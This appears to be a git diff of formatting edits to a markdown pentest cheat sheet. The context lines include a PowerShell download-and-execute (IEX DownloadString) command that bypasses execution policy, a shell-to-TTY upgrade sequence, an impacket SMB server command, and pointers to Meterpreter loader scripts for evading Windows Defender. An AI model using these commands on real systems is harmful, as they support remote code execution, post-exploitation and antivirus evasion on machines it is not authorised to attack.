@@ -6,21 +6,22 @@ powershell.exe -exec bypass -Command “IEX (New-Object Net.WebClient).DownloadS
 # Here call the modules you want to execute, depending on the usage of what you have downloaded
 ```
 ## Utils
-## Shell to TTY
+### Shell to TTY
 ```bash
 python -c "import pty;pty.spawn('/bin/bash')"
 Ctrl + z
 stty raw -echo
 fg
 ```
-## Sharing files with Windows machine
+### Sharing files with Windows machine
 **NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)* 
 ```bash
 impacket-smbserver share <path> -smb2support
 ```
 ## PrivEsc on Windows
 ### Bypassing Windows Defender
-There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/), from **Astr0baby's blog**, just copy-paste them.
+There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/), from **Astr0baby's blog**, just copy-paste them. 
+
 **NOTE:** There're some replaces needed in the listener.sh script:
 
 1. *Line 12:* remove the ./ from the call to msfconsole
